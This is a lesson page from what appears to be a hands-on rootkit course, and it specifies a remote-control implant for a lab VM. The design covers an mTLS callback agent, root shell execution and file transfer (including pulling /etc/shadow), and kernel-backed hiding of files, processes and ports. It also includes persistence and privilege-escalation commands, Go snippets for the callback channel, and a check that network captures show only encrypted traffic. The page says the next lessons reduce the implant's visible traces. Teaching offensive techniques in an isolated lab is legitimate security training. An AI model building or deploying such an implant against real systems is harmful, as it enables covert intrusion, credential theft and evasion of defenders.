# M02: Remote Control

L15 through L19 built the pieces: mTLS transport, mkdir bridge, command
dispatch, shell execution, file transfer.
M02 assembles them into one remote-control system.
The operator provides a terminal and browser dashboard on the host.
The server relays commands over mTLS to the agent in the VM.
The agent executes them directly or translates them into kernel commands.

## What you will observe

Start the target and operator independently.
The callback then appears in both operator interfaces, and a command crosses the
encrypted connection and returns the target's real output:

```console
rklings> shell id
uid=0(root) gid=0(root) groups=0(root)
```

## Workspace

```text
exercises/M02-remote-control
├── cmd
│   ├── agent
│   │   └── main.go
│   └── server
│       ├── main.go
│       ├── tui.go
│       └── web.go
├── go.mod
└── go.sum
```

Complete both ends of the protocol.
The agent owns target-side execution; the server owns connections, target
selection, and the two operator views.

## Architecture

```text
+--------------------+
| OPERATOR HOST      |
| terminal prompt    |
| browser UI :8080   |
| target selection   |
+----------+---------+
           | TLS 1.3 + mTLS
           v
+--------------------+
| TARGET VM          |
| mTLS client        |
| dispatch loop      |
| command handlers   |
+----------+---------+
           | mkdir control
           v
+--------------------+
| rklings.ko         |
| local controls     |
+--------------------+
```

## Protocol

Plaintext lines over mTLS.
Newline-delimited.
No framing, no encoding.
TLS handles integrity and confidentiality.

```text
  server -> agent: PING\n
  agent -> server: PONG\n

  server -> agent: SHELL id\n
  agent -> server: OK\nuid=0(root) gid=0(root)\n.\n

  server -> agent: DOWNLOAD /etc/passwd\n
  agent -> server: 1523\n<1523 raw bytes>

  server -> agent: HIDE FILE secret.txt\n
  agent -> server: OK\n
  (agent runs: mkdir /tmp/rklings.h.f.secret.txt)
```

Shell output ends with a line containing only a dot (`.`).
File transfers send a decimal byte count, then that many raw bytes.

## Command set

| Command            | Agent action                                 |
| ------------------ | -------------------------------------------- |
| PING               | Reply PONG                                   |
| STATUS             | Report PID and uid                           |
| SHELL <cmd>        | exec.Command("sh", "-c", cmd), return output |
| DOWNLOAD <path>    | Send file size + raw bytes                   |
| UPLOAD <path>      | Receive file size + raw bytes, write to path |
| HIDE FILE <name>   | mkdir rklings.h.f.<name>                     |
| HIDE PID <pid>     | mkdir rklings.h.i.<pid>                      |
| HIDE PORT <port>   | mkdir rklings.h.p.<port>                     |
| HIDE CONTENT <str> | mkdir rklings.h.c.<str>                      |
| UNHIDE <type> <v>  | mkdir rklings.u.<type>.<same value>          |
| PERSIST            | mkdir rklings.persist                        |
| ESCALATE           | mkdir rklings.e                              |
| ESCALATE <pid>     | mkdir rklings.e.<pid>                        |

## Operator terminal

M02 keeps a small line-oriented prompt so each request and response remains
visible.
P00 reuses the protocol in the full terminal operator.

TUI commands map to protocol commands:

```text
  operator> ping
  PONG (12ms)

  operator> shell whoami
  root

  operator> hide file secret.txt
  OK

  operator> download /etc/shadow
  saved 1247 bytes -> .rklings/downloads/etc/shadow
```

The terminal writes the raw response to disk, so text and binary files follow
the same path.
The browser keeps an explicit preview and save action.

## Operator dashboard

The integrated brutalist dashboard on `127.0.0.1:8080` provides agent-reported
target status, one-shot commands, a persistent PTY shell, file browsing,
upload/download, process and port snapshots, command history, and connection
events.
Every snapshot and transfer runs through the connected agent; the server does
not generate sample target data.

Sequence:

```text
L18: one command -> one result
M02: persistent guest PTY -> framed input/output -> browser terminal
```

## Implement it

Two binaries:

`cmd/agent/main.go`:

- mTLS dial with embedded certs
- Command dispatch loop (bufio.Scanner)
- Handlers: PING, STATUS, SHELL, PTY, DOWNLOAD, UPLOAD, HIDE, PERSIST, ESCALATE
- mkdir bridge for kernel commands

`cmd/server/main.go`:

- mTLS listener (server cert + client CA verification)
- Accept agent connection, store reference
- Start TUI and webapp goroutines

`cmd/server/tui.go`:

- standard-library input loop and command parsing
- Each TUI command sends protocol line to agent, reads response
- clear success and error output

**cmd/server/web.go**:

- serve the built React dashboard on `127.0.0.1:8080`
- `/ws` for state, commands, snapshots, and downloads
- `/shell` bridges xterm input and resize events to the guest PTY

## Useful interfaces

```go
// Agent: mTLS dial
cert, _ := tls.X509KeyPair(agentCert, agentKey)
pool := x509.NewCertPool()
pool.AppendCertsFromPEM(caCert)
conn, _ := tls.Dial("tcp", serverAddr, &tls.Config{
    Certificates: []tls.Certificate{cert},
    RootCAs:      pool,
    MinVersion:   tls.VersionTLS13,
})

// Server: mTLS listen
serverCert, _ := tls.LoadX509KeyPair(certFile, keyFile)
clientPool := x509.NewCertPool()
clientPool.AppendCertsFromPEM(caCertPEM)
ln, _ := tls.Listen("tcp", ":8443", &tls.Config{
    Certificates: []tls.Certificate{serverCert},
    ClientCAs:    clientPool,
    ClientAuth:   tls.RequireAndVerifyClientCert,
    MinVersion:   tls.VersionTLS13,
})

// Terminal input loop
reader := bufio.NewReader(os.Stdin)
line, err := reader.ReadString('\n')

// Operator web transport
http.HandleFunc("/ws", stateAndCommandWebSocket)
http.HandleFunc("/shell", shellWebSocket)
http.ListenAndServe("127.0.0.1:8080", nil)

// mkdir bridge (agent side)
os.Mkdir("/tmp/rklings.h.f."+name, 0755)
```

## Test it

Start the target first:

```sh
./rklings run M02
```

The VM loads the lesson module and starts the callback agent, which retries
until an operator exists.
In a second host terminal, start the independent operator:

```sh
./rklings serve M02
```

The `rklings>` prompt appears there after the mTLS callback.
The browser is available simultaneously at `http://127.0.0.1:8080`.

Use the terminal operator:

```text
rklings> ping
PONG (8ms)
rklings> shell uname -r
7.0.0-38-generic
rklings> hide file secret.txt
OK
rklings> download /etc/hostname
[+] saved 7 bytes -> .rklings/downloads/etc/hostname
```

Or open the browser dashboard:

```text
http://127.0.0.1:8080
(dashboard: targets, shell, files, processes, ports, logs, events)
```

## Validate

```sh
./rklings validate M02
```

```text
  [+] operator starts on isolated dynamic ports
  [+] agent connects with valid client cert
  [+] TLS 1.3 negotiated
  [+] PING/PONG round-trip
  [+] SHELL executes and returns output
  [+] DOWNLOAD transfers file correctly
  [+] HIDE FILE triggers mkdir in VM
  [+] tcpdump shows only encrypted traffic
  [+] operator relay and web listener respond
  PASS
```

## Next

The operator can control the target remotely, but the deployed files, process,
callback, and local activity remain easy to inspect.
L20 through L24 reduce each of those visible deployment traces in turn.
